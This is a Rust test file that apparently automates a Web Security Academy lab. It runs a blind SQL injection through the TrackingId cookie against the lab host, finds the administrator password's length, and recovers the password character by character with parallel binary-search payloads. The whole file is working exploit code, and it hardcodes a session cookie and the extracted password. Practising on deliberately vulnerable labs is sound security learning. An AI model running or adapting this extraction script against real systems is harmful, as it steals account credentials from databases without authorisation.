#[cfg(test)]
mod tests {
    use std::sync::mpsc;

    use rayon::iter::{IntoParallelIterator, ParallelIterator};
    #[test]
    fn test_sql_brute() {
        let client = reqwest::blocking::Client::new();
        let session_id = "kcKclKY99JaMi54bhUBKzikzfLsWfkhP".to_string();
        let url = "https://0ada00a10404ba8d801bcb26002d0030.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories";

        fn check(
            payload: String,
            session_id: String,
            client: &reqwest::blocking::Client,
            url: &str,
        ) -> bool {
            let encoded = urlencoding::encode(&payload);
            let resp = client
                .get(url)
                .header(
                    "Cookie",
                    format!("TrackingId={}, session={}", encoded, session_id),
                )
                .send()
                .expect("Failed to send request")
                .text()
                .expect("Failed to read response");

            resp.contains("<div>Welcome back!</div>")
        }

        let lengths: Vec<usize> = (1..=20).into_iter().collect();

        let (sender, receiver) = mpsc::channel();

        lengths.into_par_iter().for_each(|length| {
            let client = client.clone();
            let payload = format!("' union select 'a' from users where username='administrator' and length(password)={} -- ", length);
            if check(payload, session_id.clone(), &client, url) {
                sender.send(length).unwrap();
            }
        });

        let length = receiver.recv().unwrap();
        assert_eq!(length, 20);

        let (sender, receiver) = std::sync::mpsc::channel();

        (1..=length).into_par_iter().for_each(|pos| {
            let mut left = 32;
            let mut right = 126;

            let client = client.clone();
            let session_id = session_id.clone();

            while left <= right {
                let mid: u8 = left + (right - left) / 2;

                let payload_greater = format!("' union select 'a' from users where username='administrator' and ascii(substring(password,{},1))>{} -- ", pos, mid);
                let payload_curr = format!("' union select 'a' from users where username='administrator' and ascii(substring(password,{},1))={} -- ", pos, mid);

                if check(payload_curr.clone(), session_id.clone(), &client, url) {
                    sender.send((pos, mid as char)).unwrap();
                    break;
                } else if check(payload_greater.clone(), session_id.clone(), &client, url) {
                    left = mid + 1
                } else {
                    if mid == 0 { break; }
                    right = mid - 1;
                }
            }
        });

        let mut password = vec!['0'; length];
        for (pos, c) in receiver.iter().take(length) {
            password[pos - 1] = c;
        }

        assert_eq!(
            password.iter().collect::<String>(),
            "uek7ez97glg8ba6g8eav".to_string()
        );
    }
}
